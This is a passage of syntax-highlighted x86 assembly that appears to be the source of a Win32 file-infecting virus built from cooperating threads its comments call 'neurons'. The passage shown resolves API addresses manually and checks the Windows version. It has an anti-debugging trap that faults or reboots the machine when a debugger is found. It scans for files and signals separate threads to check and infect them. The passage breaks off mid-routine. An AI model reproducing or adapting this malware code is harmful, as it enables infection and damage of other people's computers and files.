    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'.'</span><span class="sc0">    
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">IT_nup</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">no_up</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">no_up</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc0">
</span><span class="sc5">IT_nup</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Get_DLL_Name</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_Char_from_DLL</span><span class="sc0">
</span><span class="sc5">Found_DLL_Name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">eax.ID_OriginalFirstThunk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">Next_Imported_Name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT3</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc5">next_char</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_step</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">got_it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_char</span><span class="sc0">
</span><span class="sc5">next_step</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next_Imported_Name</span><span class="sc0">
</span><span class="sc5">got_it</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">
</span><span class="sc5">End_GetProcAddressIT3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">End_GetProcAddressIT2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">n6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">End_GetProcAddressIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetProcAddressIT</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_GetVersion</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">n_getver</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc0">                </span><span class="sc1">;delta offset as dendrit</span><span class="sc0">

</span><span class="sc5">n7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">nVersion_susp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">                 </span><span class="sc1">;synchronize</span><span class="sc0">
</span><span class="sc5">nVersion_run</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nVersion_susp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetVersion</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get version of windoze</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">WinNT</span><span class="sc0">                    </span><span class="sc1">;WinNT present</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a04h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Win95</span><span class="sc0">                    </span><span class="sc1">;Win95 present</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;probably Win98</span><span class="sc0">

</span><span class="sc5">Win95</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_gv</span><span class="sc0">
</span><span class="sc5">WinNT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">n_gv</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumOfExecs</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;increment variable</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ndeb_param</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nDebugger_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;resume thread (synapse)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">Neuron_GetVersion</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ExitThread</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;current thread will be canceled</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddExitThread</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_Debugger</span><span class="sc0">     </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">n_debugger</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc0">                </span><span class="sc1">;delta as dendrit1</span><span class="sc0">

</span><span class="sc5">n8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">nDebugger_susp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">                 </span><span class="sc1">;synchronize</span><span class="sc0">
</span><span class="sc5">nDebugger_run</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nDebugger_susp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">                                     </span><span class="sc1">;version of Windoze as dendrit2</span><span class="sc0">
</span><span class="sc5">ndeb_param</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_debugger</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seh_fn</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;SEH trap</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Win98_trap</span><span class="sc0">

</span><span class="sc5">seh_rs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szIsDebuggerPresent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">             </span><span class="sc1">;get API address</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_debugger</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">;is debugger present ?</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_debugger</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">WinNT_trap</span><span class="sc0">

</span><span class="sc5">Win98_trap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">19cdh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">666</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">666</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WinNT_trap</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;int 19h</span><span class="sc0">

</span><span class="sc5">WinNT_trap</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">n9</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;GP fault</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">seh_fn</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seh_rs</span><span class="sc0">

</span><span class="sc5">end_debugger</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nFind_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;resume thread (synapse)</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">Neuron_Debugger</span><span class="sc0">     </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_Find</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">n_find</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc0">

</span><span class="sc5">n10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">find_susp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">
</span><span class="sc5">nFind_run</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">find_susp</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szExt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindFirstFileA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;find first file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_Find</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;save handle</span><span class="sc0">

</span><span class="sc5">check</span><span class="sc4">&amp;</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCheck_run</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;resume check_file neuron</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">nFind1_wait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nFind1_wait</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_next_file</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nInfect_run</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;resume infect_file neuron</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">nFind2_wait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nFind2_wait</span><span class="sc0">

</span><span class="sc5">try_next_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindNextFileA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;find next file</span><span class="sc0">
</span><span class="sc5">t3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc4">&amp;</span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">end_Find</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">                 </span><span class="sc1">;quit-signal to all neurons</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCheck_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nInfect_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
